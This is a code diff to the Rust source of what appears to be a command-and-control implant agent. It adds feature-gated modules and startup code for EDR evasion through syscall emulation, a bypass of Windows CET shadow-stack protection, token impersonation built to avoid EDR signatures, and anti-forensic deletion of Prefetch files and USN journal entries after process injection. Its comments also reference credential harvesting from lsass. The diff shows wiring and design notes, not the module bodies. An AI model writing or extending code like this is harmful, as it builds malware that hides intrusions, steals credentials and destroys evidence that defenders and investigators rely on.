@@ -170,6 +170,54 @@ pub mod injection_transacted;
 #[cfg(all(windows, feature = "delayed-stomp"))]
 pub mod injection_delayed_stomp;
 
+// User-mode NT kernel interface emulation: routes configured Nt* syscalls
+// through kernel32/advapi32 equivalents instead of ntdll syscall stubs.
+// Makes the agent invisible to EDR hooks on ntdll AND to ntdll unhooking
+// detection.  Call stacks show kernel32!WriteProcessMemory etc. — looks
+// like legitimate API usage.  Falls back to existing indirect syscall path
+// when kernel32 equivalent fails.  Windows-only, gated by `syscall-emulation`
+// feature flag (implies `direct-syscalls`).
+#[cfg(all(windows, feature = "syscall-emulation"))]
+pub mod syscall_emulation;
+
+// CET (Control-flow Enforcement Technology) / Shadow Stack bypass: handles
+// Windows 11 24H2+ hardware-enforced shadow stacks that defeat return-address
+// spoofing and stack pivoting.  Three strategies: (1) disable CET via process
+// mitigation policy, (2) CET-compatible call chain building, (3) VEH-based
+// shadow stack fix (experimental, requires kernel access via kernel-callback).
+// Integrates with the existing stack-spoofing code in syscalls.rs by adding
+// a CET-awareness check at the entry point of spoof_call.  Windows-only,
+// gated by `cet-bypass` feature flag (implies `direct-syscalls`).
+#[cfg(all(windows, feature = "cet-bypass"))]
+pub mod cet_bypass;
+
+// Token-only impersonation via NtImpersonateThread / SetThreadToken:
+// bypasses ImpersonateNamedPipeClient detection by extracting the
+// impersonation token through a helper thread and applying it to the
+// main thread via NtSetInformationThread(ThreadImpersonationToken).
+// Alternative strategy uses DuplicateTokenEx + SetThreadToken directly.
+// Includes encrypted token cache, auto-revert on task completion, and
+// integration with lsass_harvest and P2P SMB pipe connections.
+// Windows-only, gated by `token-impersonation` feature flag
+// (implies `direct-syscalls`).
+#[cfg(all(windows, feature = "token-impersonation"))]
+pub mod token_impersonation;
+
+// Forensic cleanup subsystem: removes forensic evidence left by injected
+// processes.  Currently provides Windows Prefetch (.pf) evidence removal
+// via three strategies: delete (NtDeleteFile), patch (NtCreateSection +
+// NtMapViewOfSection — preferred, file remains but contains no forensic
+// data), and disable-service (registry EnablePrefetcher = 0).  Also
+// cleans USN journal entries referencing the .pf file.  All NT API calls
+// use indirect syscalls via nt_syscall to bypass EDR hooks.
+// Hooks into injection_engine post-injection for automatic cleanup.
+// Handles DISK evidence only — does NOT overlap with any memory-hygiene
+// subsystem.
+// Windows-only, gated by `forensic-cleanup` feature flag
+// (implies `direct-syscalls`).
+#[cfg(all(windows, feature = "forensic-cleanup"))]
+pub mod forensic_cleanup;
+
 use anyhow::Result;
 use common::{CryptoSession, Message, Transport};
 use log::{error, info, warn};
@@ -377,6 +425,59 @@ impl Agent {
             ) {
                 log::warn!("evanesco: init failed (non-fatal): {e:#}");
             }
+        }
+
+        // Initialise user-mode NT kernel interface emulation.  This MUST
+        // happen before any injection or memory operations that would
+        // otherwise go through ntdll syscall stubs.  The emulation layer
+        // routes configured Nt* calls through kernel32/advapi32 equivalents,
+        // making the agent invisible to EDR hooks on ntdll.
+        #[cfg(all(windows, feature = "syscall-emulation"))]
+        {
+            let cfg = self.config.read().await;
+            crate::syscall_emulation::init_from_config(&cfg.syscall_emulation);
+            log::info!(
+                "syscall_emulation: initialised (enabled={}, prefer_kernel32={}, emulated={:?})",
+                cfg.syscall_emulation.enabled,
+                cfg.syscall_emulation.prefer_kernel32,
+                cfg.syscall_emulation.emulated_functions,
+            );
+        }
+
+        // Initialise CET / shadow-stack bypass.  This MUST happen before any
+        // injection or stack-spoofing operations that manipulate return
+        // addresses.  Detects the current CET state and configures the
+        // appropriate bypass strategy (policy disable, call chain, or VEH).
+        #[cfg(all(windows, feature = "cet-bypass"))]
+        {
+            let cfg = self.config.read().await;
+            crate::cet_bypass::init_from_config(&cfg.cet_bypass);
+            log::info!(
+                "cet_bypass: initialised (enabled={}, state={})",
+                cfg.cet_bypass.enabled,
+                crate::cet_bypass::cet_state(),
+            );
+        }
+
+        // Token-only impersonation: avoids ImpersonateNamedPipeClient
+        // on the main agent thread, which is heavily signatured by EDR.
+        // Uses NtImpersonateThread or SetThreadToken to apply extracted
+        // tokens instead.  Includes encrypted token cache and auto-revert.
+        #[cfg(all(windows, feature = "token-impersonation"))]
+        {
+            let cfg = self.config.read().await;
+            crate::token_impersonation::init_from_config(&cfg.token_impersonation);
+        }
+
+        // Initialise the forensic cleanup subsystem.  Loads config for
+        // Prefetch evidence removal (cleanup method, auto-clean after
+        // injection, USN journal cleanup, etc.).  All NT API calls use
+        // indirect syscalls to bypass EDR hooks.
+        #[cfg(all(windows, feature = "forensic-cleanup"))]
+        {
+            let cfg = self.config.read().await;
+            crate::forensic_cleanup::prefetch::init_from_config(&cfg.prefetch);
+            crate::forensic_cleanup::timestamps::init_from_config(&cfg.timestamps);
         }
 
         #[cfg(feature = "stealth")]
